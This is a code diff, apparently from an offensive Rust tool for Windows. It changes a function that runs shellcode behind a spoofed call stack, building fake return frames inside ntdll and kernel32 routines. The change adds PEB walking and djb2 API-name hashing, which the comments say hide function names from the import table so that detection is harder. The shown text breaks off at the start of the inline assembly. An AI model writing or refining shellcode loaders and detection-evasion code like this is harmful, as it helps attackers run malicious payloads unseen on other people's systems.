@@ -1,26 +1,30 @@
 #[cfg(all(target_os = "windows", target_arch = "x86_64"))]
 pub unsafe fn spoof_and_call(shellcode_fn: extern "C" fn()) {
-    use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
+    use crate::resolve::api_hash::{djb2_hash, djb2_hash_lower, peb_get_module_base, resolve_by_hash};
 
-    let ntdll    = GetModuleHandleA(b"ntdll.dll\0".as_ptr());
-    let k32      = GetModuleHandleA(b"kernel32.dll\0".as_ptr());
-    let kbase    = GetModuleHandleA(b"kernelbase.dll\0".as_ptr());
+    // Resolve module bases from PEB (no GetModuleHandle call-site string in import table)
+    const NTDLL_H:  u32 = djb2_hash_lower(b"ntdll.dll");
+    const K32_H:    u32 = djb2_hash_lower(b"kernel32.dll");
+    const KBASE_H:  u32 = djb2_hash_lower(b"kernelbase.dll");
 
-    let rts      = GetProcAddress(ntdll,  b"RtlUserThreadStart\0".as_ptr());
-    let btit     = GetProcAddress(k32,    b"BaseThreadInitThunk\0".as_ptr());
-    let ldr      = GetProcAddress(ntdll,  b"LdrLoadDll\0".as_ptr());
-    let ldrp_ptr = GetProcAddress(ntdll,  b"LdrpLoadDll\0".as_ptr());
-    let llew     = GetProcAddress(kbase,  b"LoadLibraryExW\0".as_ptr());
+    let ntdll = peb_get_module_base(NTDLL_H);
+    let k32   = peb_get_module_base(K32_H);
+    let kbase = peb_get_module_base(KBASE_H);
 
-    let f1 = if llew != 0 { (core::mem::transmute::<_, usize>(llew)).wrapping_add(0x1B0) } else { 0 };
-    let f2 = if ldr  != 0 { (core::mem::transmute::<_, usize>(ldr)).wrapping_add(0x9F)  } else { 0 };
-    let f3 = if ldrp_ptr != 0 {
-        (core::mem::transmute::<_, usize>(ldrp_ptr)).wrapping_add(0x1F3)
-    } else if ldr != 0 {
-        (core::mem::transmute::<_, usize>(ldr)).wrapping_add(0x150)
-    } else { 0 };
-    let f4 = if rts  != 0 { (core::mem::transmute::<_, usize>(rts)).wrapping_add(0x14)  } else { 0 };
-    let f5 = if btit != 0 { (core::mem::transmute::<_, usize>(btit)).wrapping_add(0x10) } else { 0 };
+    // Resolve function addresses by hash (no GetProcAddress or plaintext names)
+    let rts      = if !ntdll.is_null() { resolve_by_hash(ntdll, djb2_hash(b"RtlUserThreadStart")) } else { None };
+    let btit     = if !k32.is_null()   { resolve_by_hash(k32,   djb2_hash(b"BaseThreadInitThunk")) } else { None };
+    let ldr      = if !ntdll.is_null() { resolve_by_hash(ntdll, djb2_hash(b"LdrLoadDll")) } else { None };
+    let ldrp_ptr = if !ntdll.is_null() { resolve_by_hash(ntdll, djb2_hash(b"LdrpLoadDll")) } else { None };
+    let llew     = if !kbase.is_null() { resolve_by_hash(kbase, djb2_hash(b"LoadLibraryExW")) } else { None };
+
+    let f1 = llew.map(|p| p as usize + 0x1B0).unwrap_or(0);
+    let f2 = ldr.map(|p|  p as usize + 0x9F).unwrap_or(0);
+    let f3 = ldrp_ptr.map(|p| p as usize + 0x1F3)
+        .or_else(|| ldr.map(|p| p as usize + 0x150))
+        .unwrap_or(0);
+    let f4 = rts.map(|p|  p as usize + 0x14).unwrap_or(0);
+    let f5 = btit.map(|p| p as usize + 0x10).unwrap_or(0);
 
     core::arch::asm!(
         "sub rsp, 0x60",
